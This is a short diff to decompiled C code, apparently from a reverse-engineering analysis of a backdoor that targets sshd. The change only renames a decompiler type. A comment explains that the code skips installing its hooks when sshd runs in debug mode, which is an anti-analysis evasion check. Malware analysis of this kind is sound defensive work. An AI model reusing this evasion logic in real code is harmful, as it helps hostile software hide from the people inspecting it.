@@ -47,7 +47,7 @@ BOOL process_is_sshd(elf_info_t *elf,u8 *stack_end)
           return FALSE;
         }
         // AutoDoc: Let the helper spot strings containing lowercase `d` so sshd's debug modes never reach the hooks.
-        debug_match = check_argument((char)*(undefined2 *)argv_entry,(char *)argv_entry);
+        debug_match = check_argument((char)*(u16 *)argv_entry,(char *)argv_entry);
         if (debug_match != (char *)0x0) {
           return FALSE;
         }
